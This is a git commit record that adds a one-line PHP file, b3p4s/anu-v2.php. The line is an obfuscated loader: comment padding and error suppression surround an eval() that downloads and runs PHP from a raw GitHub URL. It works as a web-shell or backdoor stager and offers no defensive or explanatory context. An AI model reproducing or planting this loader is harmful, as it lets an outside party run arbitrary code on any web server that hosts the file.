2953391a8fb2680e7bb32f9af75d3e8f06dcc1cf
Z4PHY <mahardidono@gmail.com>
2024-02-01 12:49:36 +0700

    Z4PHY

---
+++ b3p4s/anu-v2.php
@@ -0,0 +1,1 @@
+<?=/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/z4phyr/z4phy-c0de/main/b3p4s/call-b-z4p-v2.php"))/******/ /*b-z4p*/?>
